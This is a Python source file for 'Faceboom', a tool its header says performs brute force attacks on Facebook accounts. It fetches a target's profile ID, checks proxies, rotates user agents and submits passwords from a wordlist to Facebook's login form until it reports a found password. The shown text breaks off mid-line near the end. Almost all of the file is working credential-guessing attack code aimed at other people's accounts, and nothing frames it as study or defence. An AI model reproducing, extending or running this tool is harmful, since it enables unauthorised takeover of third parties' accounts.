#!/usr/bin/python
# -*- coding: utf-8 -*-

##################################
# Program Name: Faceboom ~ v 1.1.0
# Working : Brute Force Attack on Facebook Accounts
# Author : Hassan Tahir
##################################


# Imported Libraries

import socket
import time
import os
import optparse
import random
import re
try:
    import requests
except ImportError:
    print("[!] Error: [ requests ] Module Is Missed \n[*] Please Install it Using this command> [ pip install requests ]")
    exit(1)
try:
    import mechanize
except ImportError:
    print("[!] Error: [ mechanize ] Module Is Missed \n[*] Please Install it Using this command> [ pip install mechanize ]")
    exit(1)
os.system("cls||clear")


# Colors

wi = "\033[1;37m"
rd = "\033[1;31m"
gr = "\033[1;32m"
yl = "\033[1;33m"


# Hosting Secure Connection

def cnet():
    try:
        ip = socket.gethostbyname("www.google.com")
        con = socket.create_connection((ip, 80), 2)
        return True
    except socket.error:
        pass
    return False


# Checking Proxy and Ports

def cpro(ip, port=None):
    proxy = '{}:8080'.format(ip) if port == None else '{}:{}'.format(ip, port)
    proxies = {'https': "https://" + proxy, 'http': "http://" + proxy}
    try:
        r = requests.get('https://www.wikipedia.org', proxies=proxies, timeout=5)
        if ip == r.headers['X-Client-IP']:
            return True
        else:
            return False
    except Exception:
        return False


# Choice Random User-Agent supporting browser

def useragent():
    useragents = [
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',
        'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
        'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6',
        'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1']
    return random.choice(useragents)


# Fetching Victim Profile ID

def ID(url):
    try:
        idre = re.compile('"entity_id":"([0-9]+)"')
        con = requests.get(url).content
        idis = idre.findall(con)
        print(gr + "\n[" + wi + "*" + gr + "] Target Profile" + wi + " ID: " + yl + idis[0] + wi)
    except IndexError:
        print(rd + "\n[" + yl + "!" + rd + "] Error:" + yl + " Please Check Your Victem Profile URL " + rd + "!!!" + wi)
        exit(1)


# Brute Force Main Frame

def FBOM(username, wordlist, proxy=None, passwd=None):
    if passwd == None:
        if not os.path.isfile(wordlist):
            print(rd + "\n[" + yl + "!" + rd + "] Error:" + yl + " No Such File: [ " + rd + str(
                wordlist) + yl + " ] " + rd + "!!!" + wi)
            exit(1)
    if cnet() != True:
        print(rd + "\n[" + yl + "!" + rd + "] Error:" + yl + " Please Check Your Intenrnet Connection " + rd + "!!!" + wi)
        exit(1)

    if proxy != None:
        print(wi + "[" + yl + "~" + wi + "] Connecting To " + wi + "Proxy[\033[1;33m {} \033[1;37m]...".format(
            proxy if ":" not in proxy else proxy.split(":")[0]))
        if ":" not in proxy:
            if proxy.count(".") == 3:
                if cpro(proxy) == True:
                    print(wi + "[" + gr + "Connected" + wi + "]")
                    useproxy = proxy + ":8080"
                else:
                    if cpro(proxy, port=80) == True:
                        print(wi + "[" + gr + "Connected" + wi + "]")
                        useproxy = proxy + ":80"
                    else:
                        print(rd + "[" + yl + "Connection Failed" + rd + "] !!!" + wi)
                        useproxy = False
                        print(rd + "\n[" + yl + "!" + rd + "] Error:" + yl + " Invalid HTTP/S Proxy[" + rd + str(
                            proxy) + yl + "]" + rd + " !!!" + wi)
                        exit(1)
            else:
                useproxy = False
                print(rd + "\n[" + yl + "!" + rd + "] Error:" + yl + "Invalid IPv4 [" + rd + str(
                    proxy) + yl + "] " + rd + "!!!" + wi)
                exit(1)
        else:
            proxy, port = proxy.split(":")
            if proxy.count(".") == 3:
                if not port.isdigit() or int(port) < 0 or int(port) > 65535:
                    print(rd + "\n[" + yl + "!" + rd + "] Error:" + yl + " Invalid Port [" + rd + port + yl + "] Should Be In Range(" + wi + "0-65535" + yl + ")" + rd + "!!!" + wi)
                    exit(1)
                if cpro(proxy, port=port) == True:
                    print(wi + "[" + gr + "Connected" + wi + "]")
                    useproxy = proxy + ":" + port
                else:
                    print(rd + "[" + yl + "Connection Failed" + rd + "] !!!" + wi)
                    useproxy = False
                    print(rd + "\n[" + yl + "!" + rd + "] Error:" + yl + " Invalid HTTP/S Proxy[" + rd + str(
                        proxy) + yl + "]" + rd + " !!!" + wi)
                    exit(1)
            else:
                useproxy = False
                print(rd + "\n[" + yl + "!" + rd + "] Error:" + yl + " Invalid IPv4 [" + rd + str(
                    proxy) + yl + "] " + rd + "!!!" + wi)
                exit(1)
    else:  # CLI GUI parameters
        useproxy = False
    prox = gr + useproxy.split(":")[0] + wi + ":" + yl + useproxy.split(":")[1] if useproxy != False else ""
    proxystatus = prox + wi + "[" + gr + "ON" + wi + "]" if useproxy != False else yl + "[" + rd + "OFF" + yl + "]"
    print(gr + """
----------------------------------
[---]        """ + wi + """Faceboom""" + gr + """         [---]
----------------------------------
[---]  """ + wi + """Brute Forcing Facebook  """ + gr + """ [---]
----------------------------------
[---]         """ + yl + """CONFIG""" + gr + """         [---]
----------------------------------
[>] Target      :> """ + wi + username + gr + """
{}""".format("[>] Wordlist    :> " + yl + str(wordlist) if passwd == None else "[>] Password    :> " + yl + str(
        passwd)) + gr + """
[>] ProxyStatus :> """ + str(proxystatus) + gr + """      
----------------------------------""" + wi + """
[~] """ + yl + """Brute""" + rd + """ Force Attack: """ + gr + """Enabled """ + wi + """[~]""" + gr + """
----------------------------------
""")
    loop = 1
    br = mechanize.Browser()
    br.set_handle_robots(False)
    if useproxy != False:
        br.set_proxies({'https': useproxy, 'http': useproxy})
    br.addheaders = [('User-agent', useragent())]
    issuccess = 0
    if passwd != None:
        if not passwd.strip() or len(passwd) < 6:
            print(yl + "\n[" + rd + "!" + yl + "] Invalid Password [ " + rd + passwd + yl + " ]" + rd + " !!!" + wi)
            exit(1)
        passwd = passwd.strip()
        try:
            print(wi + "[" + yl + "~" + wi + "] Trying Single Password[ {" + yl + str(passwd) + wi + "} ]")
            br.open("https://www.facebook.com")
            br.select_form(nr=0)
            if 'email' in br.form:
                br.form["email"] = username
            else:
                print(yl + "==> Error:" + rd + " No email field found in the form. Exiting...")
                exit(1)
            br.form["pass"] = passwd
            br.method = "POST"
            if br.submit().get_data().__contains__('home_icon'):
                issuccess = 1
                print(wi + "==> Login" + gr + " Success\n")
                print(wi + "=========================" + "=" * len(passwd) + "======")
                print(wi + "[" + gr + "+" + wi + "] Password [ " + gr + passwd + wi + " ]" + gr + " Is Correct :)")
                print(wi + "=========================" + "=" * len(passwd) + "======")
            else:
                print(yl + "==> Login" + rd + " Failed\n")
        except (KeyboardInterrupt, EOFError):
            print(rd + "\n[" + yl + "!" + rd + "]" + yl + " Aborting" + rd + "..." + wi)
            time.sleep(1.5)
            issuccess = 2
        except Exception as e:
            issuccess = 2
            print(rd + "\n[" + yl + "!" + rd + "] Error: " + yl + str(e) + wi)
            time.sleep(0.60)

        if issuccess == 0:
            print(yl + "\n[" + rd + "!" + yl + "] Sorry: " + wi + "The Password[ " + yl + passwd + wi + " ] Is Not Correct" + rd + ":(" + yl + "!" + wi)
            print(gr + "[" + yl + "!" + gr + "]" + yl + " Please Try other password or Wordlist File " + gr + ":)" + wi)
        exit(1)
    with open(wordlist) as wfile:
        for passwd in wfile:
            if not passwd.strip() or len(passwd.strip()) < 6:
                continue
            passwd = passwd.strip()
            try:
                print(wi + "[" + yl + str(loop) + wi + "] Trying Password[ {" + yl + str(passwd) + wi + "} ]")
                br.open("https://facebook.com")
                br.select_form(nr=0)
                if 'email' in br.form:
                    br.form["email"] = username
                else:
                    print(yl + "==> Error:" + rd + " No email field found in the form. Exiting...")
                    exit(1)
                br.form["pass"] = passwd
                br.method = "POST"
                if br.submit().get_data().__contains__('home_icon'):
                    issuccess = 1
                    print(wi + "==> Login" + gr + " Success\n")
                    print(wi + "=========================" + "=" * len(passwd))
                    print(wi + "[" + gr + "+" + wi + "] Password " + gr + "Found:" + wi + ">>>>[ " + gr + "{}".format(passwd))
                    print(wi + "=========================" + "=" * len(passwd))
                    break
                else:
                    print(yl + "==> Login" + rd + " Failed\n")
                loop += 1
            except (KeyboardInterrupt, EOFError):
                print(rd + "\n[" + yl + "!" + rd + "]" + yl + " Aborting" + rd + "..." + wi)
                time.sleep(1.5)
                exit(1)
            except Exception as e:
                print(rd + "[" + yl + "!" + rd + "] Error: " + yl + str(e) + wi)
                time.sleep(0.60)

    if issuccess == 0:
        print(yl + "\n[" + rd + "!" + yl + "] Sorry: " + wi + "I Can't Find The Correct Password In [ " + yl + wordlist + wi + " ] " + rd + ":(" + yl + "!" + wi)
        print(gr + "[" + yl + "!" + gr + "]" + y

                   